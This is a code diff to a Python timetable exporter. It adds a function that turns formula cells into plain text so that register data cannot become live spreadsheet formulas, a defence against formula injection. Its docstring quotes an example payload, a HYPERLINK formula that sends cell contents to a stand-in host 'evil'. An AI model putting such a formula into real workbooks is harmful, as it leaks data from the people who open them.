@@ -317,4 +317,18 @@ def export_workbook(result: ScheduleResult, path: str,
                     lambda k, placed: f"Room-wise timetable · {len(placed)} session-slots this week",
                     lambda ps: f"{ps.session.teacher} · {ps.session.section}")
 
+    _neutralize_formulas(wb)
     wb.save(path)
+
+
+def _neutralize_formulas(wb) -> None:
+    """openpyxl saves any string starting with "=" as a live formula. Every
+    value in this workbook is plain text from the register (teacher names,
+    course codes, ...), never an intended formula, so store all of them as
+    text: a register row like =HYPERLINK("http://evil/?"&A1,"x") must not
+    become an active formula in the timetable people download and open."""
+    for ws in wb.worksheets:
+        for row in ws.iter_rows():
+            for cell in row:
+                if cell.data_type == "f":
+                    cell.data_type = "s"
